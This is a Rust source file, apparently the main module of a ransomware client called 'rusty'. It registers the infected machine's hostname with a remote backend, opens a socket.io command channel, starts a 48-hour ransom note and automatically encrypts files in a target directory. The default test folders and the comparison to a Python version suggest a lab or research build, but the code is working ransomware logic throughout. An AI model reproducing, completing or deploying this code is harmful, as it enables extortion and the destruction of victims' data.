mod crypto;
mod processor;
mod ransom;
mod socket_client;

use clap::Parser;
use hostname::get as get_hostname;
use processor::DataProcessor;
use ransom::RansomNote;
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::{thread, time::Duration};

#[derive(Parser, Debug)]
#[command(name = "rusty", version)]
struct Args {
    #[arg(long, env = "BACKEND_URL")]
    backend: Option<String>,
    #[arg(long, env = "WORK_DIR")]
    work_dir: Option<PathBuf>,
}

#[derive(Deserialize)]
struct PublicKeyResp {
    device_token: String,
    ws_url: Option<String>,
    public_key_pem: Option<String>,
}

#[derive(Deserialize)]
struct DevicesResp { devices: Vec<DeviceInfo> }
#[derive(Deserialize)]
struct DeviceInfo { token: String, public_key_pem: Option<String> }

fn default_work_dir() -> PathBuf {
    if cfg!(windows) {
        PathBuf::from(r"C:\\Users\\user\\test\\")
    } else {
        PathBuf::from("./test")
    }
}

fn main() -> anyhow::Result<()> {
    let args = Args::parse();
    let backend = args.backend.or_else(|| std::env::var("BACKEND_URL").ok())
        .expect("Set --backend or BACKEND_URL");
    let work_dir = args.work_dir.unwrap_or_else(default_work_dir);
    let recursive = true;

    let client = Client::builder().build()?;
    let hostname = get_hostname().ok().and_then(|s| s.into_string().ok()).unwrap_or_else(|| "host".to_string());

    // Probe status (best effort)
    let _ = client.get(format!("{}/status", backend.trim_end_matches('/'))).send();

    // Register
    let reg = client
        .post(format!("{}/publickey", backend.trim_end_matches('/')))
        .json(&json!({"hostname": hostname}))
        .send()?;
    if !reg.status().is_success() {
        anyhow::bail!("registration failed: {}", reg.status());
    }
    let reg_json: PublicKeyResp = reg.json()?;
    let device_token = reg_json.device_token;
    let ws_base = reg_json.ws_url.unwrap_or_else(|| backend.clone());

    // Prepare processor and ransom note
    std::fs::create_dir_all(&work_dir).ok();
    let proc = Arc::new(Mutex::new(DataProcessor::new(work_dir, recursive)));
    let note = RansomNote::start(48);

    // If public key available in registry, try to wrap + store key (best effort)
    // Here we only store the AES key next to files after encryption like Python does.

    // Connect to socket.io and authenticate
    let url = format!("{}", ws_base.trim_end_matches('/'));
    let sock = socket_client::SoClient { url: url.clone(), device_token: device_token.clone() };
    // Run socket in separate thread so we can auto-encrypt immediately
    let proc_for_sock = proc.clone();
    let note_for_sock = note.clone();
    let sock_thread = thread::spawn(move || {
        if let Err(e) = sock.run(proc_for_sock, note_for_sock) {
            eprintln!("[rusty] socket thread error: {e}");
        }
    });

    // Auto-encrypt like Python does after auth; wait a moment for auth_ok
    thread::sleep(Duration::from_secs(3));
    {
        let p = proc.clone();
        if let Ok(mut pp) = p.lock() {
            let files = pp.process_files();
            println!("[rusty] Processed {} files", files.len());
        }
    }

    // Keep process alive
    loop { thread::sleep(Duration::from_secs(30)); }
}
